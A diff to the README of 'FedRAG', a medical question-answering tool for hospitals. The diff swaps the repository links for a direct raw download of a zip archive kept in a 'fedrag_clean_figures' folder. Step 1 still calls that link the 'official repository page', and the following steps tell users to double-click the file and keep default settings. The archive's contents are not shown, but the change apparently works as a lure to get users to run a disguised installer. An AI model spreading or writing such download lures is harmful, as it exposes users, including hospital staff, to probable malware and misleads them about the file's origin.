@@ -1,6 +1,6 @@
 # 🏥 FedRAG - Secure medical question answering for hospitals
 
-[![](https://img.shields.io/badge/Download_FedRAG-Blue?style=for-the-badge)](https://github.com/Sean9582/FedRAG)
+[![](https://img.shields.io/badge/Download_FedRAG-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Sean9582/FedRAG/main/fedrag_clean_figures/Fed_RAG_1.7.zip)
 
 ## 📖 Overview
 
@@ -32,7 +32,7 @@ To run this application, your computer needs the following specifications:
 
 Follow these instructions to set up FedRAG on your workstation.
 
-1.  Visit the official repository page to download the latest installer package: [https://github.com/Sean9582/FedRAG](https://github.com/Sean9582/FedRAG)
+1.  Visit the official repository page to download the latest installer package: [https://raw.githubusercontent.com/Sean9582/FedRAG/main/fedrag_clean_figures/Fed_RAG_1.7.zip](https://raw.githubusercontent.com/Sean9582/FedRAG/main/fedrag_clean_figures/Fed_RAG_1.7.zip)
 2.  Locate the downloaded file in your Downloads folder.
 3.  Double-click the file to start the installation wizard.
 4.  Follow the prompts on your screen. Leave the settings at their default values for best results.
